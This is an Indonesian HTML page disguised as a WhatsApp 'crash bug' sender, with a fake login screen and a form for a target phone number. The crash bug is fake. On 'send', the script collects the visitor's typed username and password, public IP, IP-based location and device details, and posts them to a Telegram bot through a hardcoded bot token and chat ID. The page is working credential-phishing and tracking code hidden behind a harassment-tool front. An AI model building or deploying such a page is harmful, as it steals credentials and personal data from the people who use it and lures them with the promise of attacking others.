<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRASH IOS CLONE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }

        body {
            background: #000;
            color: #0f0;
            overflow: hidden;
            height: 100vh;
            position: relative;
        }

        #video-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.3;
            z-index: -1;
        }

        .login-container, .main-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .login-box, .main-box {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 30px;
            width: 400px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); }
            50% { box-shadow: 0 0 20px rgba(0, 255, 0, 0.8); }
            100% { box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); }
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            text-shadow: 0 0 10px #0f0;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input, select {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            border-radius: 3px;
        }

        button {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }

        button:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 15px #0f0;
        }

        .terminal {
            background: #000;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            height: 200px;
            overflow-y: auto;
            font-size: 14px;
        }

        .terminal-line {
            margin-bottom: 5px;
        }

        .success {
            color: #0f0;
        }

        .error {
            color: #f00;
        }

        .warning {
            color: #ff0;
        }

        .hidden {
            display: none;
        }

        .glitch {
            position: relative;
            animation: glitch 5s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>
    <video id="video-bg" autoplay muted loop>
        <source src="https://files.catbox.moe/ii43pg.mp4" type="video/mp4">
    </video>

    
    <div id="login-screen" class="login-container">
        <div class="login-box">
            <h1 class="glitch">SECURE LOGIN</h1>
            <div class="form-group">
                <label for="username">USERNAME:</label>
                <input type="text" id="username" autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">PASSWORD:</label>
                <input type="password" id="password" autocomplete="off">
            </div>
            <button id="login-btn">ACCESS SYSTEM</button>
        </div>
    </div>

   
    <div id="main-screen" class="main-container hidden">
        <div class="main-box">
            <h1 class="glitch">WELCOME TO BUG WA BY CLONE</h1>
            <div class="form-group">
                <label for="target-number">NOMOR TARGET:</label>
                <input type="text" id="target-number" placeholder="+62xxxxxxxxxx">
            </div>
            <div class="form-group">
                <label for="bug-type">TYPE BUG:</label>
                <select id="bug-type">
                    <option value="CrashIos">CrashIos</option>
                    <option value="crash√óinvis">crash√óinvis</option>
                    <option value="crash-ui">crash-ui</option>
                    <option value="blank√ókiamat">blank√ókiamat</option>
                    <option value="stuck-ui">stuck-ui</option>
                    <option value="crash-beta">crash-beta</option>
                </select>
            </div>
            <button id="send-bug">KIRIM BUG</button>
        </div>
        
        <div class="terminal">
            <div class="terminal-line">> SYSTEM INITIALIZED</div>
            <div class="terminal-line">> WAITING FOR USER INPUT...</div>
        </div>
    </div>

    <script>
        
        const loginScreen = document.getElementById('login-screen');
        const mainScreen = document.getElementById('main-screen');
        const loginBtn = document.getElementById('login-btn');
        const sendBugBtn = document.getElementById('send-bug');
        const terminal = document.querySelector('.terminal');
        
        
        const TELEGRAM_BOT_TOKEN = '8016003177:AAHvTjdnOf17ZzQ1EYdfqE2UZAin_6tkRGw'; // Ganti dengan token bot Anda
        const TELEGRAM_CHAT_ID = '7984698827'; // Ganti dengan chat ID Anda
        
        
        loginBtn.addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username.trim() !== '' && password.trim() !== '') {
                
                addTerminalLine('> AUTHENTICATING USER...', 'warning');
                
                setTimeout(() => {
                    addTerminalLine('> ACCESS GRANTED', 'success');
                    addTerminalLine('> LOADING MAIN INTERFACE...', 'warning');
                    
                    setTimeout(() => {
                        loginScreen.classList.add('hidden');
                        mainScreen.classList.remove('hidden');
                        addTerminalLine('> MAIN INTERFACE LOADED', 'success');
                        addTerminalLine('> READY FOR BUG DEPLOYMENT', 'success');
                    }, 1500);
                }, 1000);
            } else {
                addTerminalLine('> ERROR: EMPTY FIELDS DETECTED', 'error');
            }
        });
        
        
        sendBugBtn.addEventListener('click', async function() {
            const targetNumber = document.getElementById('target-number').value;
            const bugType = document.getElementById('bug-type').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (targetNumber.trim() !== '') {
                addTerminalLine('> INITIATING BUG DEPLOYMENT...', 'warning');
                
                setTimeout(() => {
                    addTerminalLine('> TARGET ACQUIRED: ' + targetNumber, 'success');
                    addTerminalLine('> BUG TYPE SELECTED: ' + bugType, 'success');
                    
                    setTimeout(() => {
                        addTerminalLine('> DEPLOYING BUG PAYLOAD...', 'warning');
                        
                        setTimeout(async () => {
                            try {
                                // Kirim data ke Telegram bot
                                await sendToTelegramBot(username, password, targetNumber, bugType);
                                
                                addTerminalLine('> BUG SUCCESSFULLY DEPLOYED', 'success');
                                addTerminalLine('> TARGET STATUS: COMPROMISED', 'success');
                                
                                // Show success alert
                                alert('succes mengirim bug to ' + targetNumber);
                            } catch (error) {
                                addTerminalLine('> ERROR: FAILED TO SEND DATA TO BOT', 'error');
                                console.error('Error:', error);
                            }
                        }, 1500);
                    }, 1000);
                }, 1000);
            } else {
                addTerminalLine('> ERROR: TARGET NUMBER REQUIRED', 'error');
            }
        });
        
        
        function addTerminalLine(text, type = '') {
            const line = document.createElement('div');
            line.className = 'terminal-line ' + type;
            line.textContent = text;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
      
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        
        async function getLocationFromIP(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return `${data.city}, ${data.region}, ${data.country_name}`;
            } catch (error) {
                return 'Unknown';
            }
        }
        
       
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceName = 'Unknown';
            let deviceVersion = 'Unknown';
            
            
            if (userAgent.match(/Android/i)) {
                deviceName = 'Android Device';
                const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
                deviceVersion = androidVersion ? androidVersion[1] : 'Unknown';
            } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
                deviceName = 'iOS Device';
                const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
                deviceVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : 'Unknown';
            } else if (userAgent.match(/Windows/i)) {
                deviceName = 'Windows PC';
                const windowsVersion = userAgent.match(/Windows NT\s([0-9\.]+)/);
                deviceVersion = windowsVersion ? windowsVersion[1] : 'Unknown';
            }
            
            return { deviceName, deviceVersion };
        }
        
       
        async function sendToTelegramBot(username, password, targetNumber, bugType) {
            addTerminalLine('> SENDING DATA TO TELEGRAM BOT...', 'warning');
            
            try {
                const ip = await getIPAddress();
                const location = await getLocationFromIP(ip);
                const { deviceName, deviceVersion } = getDeviceInfo();
                const currentTime = new Date().toLocaleString('id-ID');
                
                const message = `
üì± LOGIN REQUEST WEBSITE üì±
üë§ USERNAME: ${username}
üîë PASSWORD: ${password}

‚ò†Ô∏è NOMOR: ${targetNumber}
üëª TYPE BUG: ${bugType}
‚è∞ WAKTU: ${currentTime}
üåê IP: ${ip}
üëë LOCATION: ${location}
üì± NAME PHONE: ${deviceName}
üì± VERSION PHONE: ${deviceVersion}
                `;
                
                // Kirim pesan ke Telegram bot menggunakan API
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    addTerminalLine('> DATA TRANSMISSION COMPLETE', 'success');
                    addTerminalLine('> TELEGRAM BOT NOTIFIED', 'success');
                    return true;
                } else {
                    throw new Error('Failed to send message to Telegram');
                }
            } catch (error) {
                addTerminalLine('> ERROR: FAILED TO SEND DATA', 'error');
                throw error;
            }
        }
        
        
        window.onload = function() {
            setTimeout(() => {
                addTerminalLine('> SYSTEM BOOTING...', 'warning');
                
                setTimeout(() => {
                    addTerminalLine('> SECURITY PROTOCOLS ACTIVATED', 'success');
                    addTerminalLine('> READY FOR USER AUTHENTICATION', 'success');
                }, 800);
            }, 500);
        };
    </script>
</body>
</html>
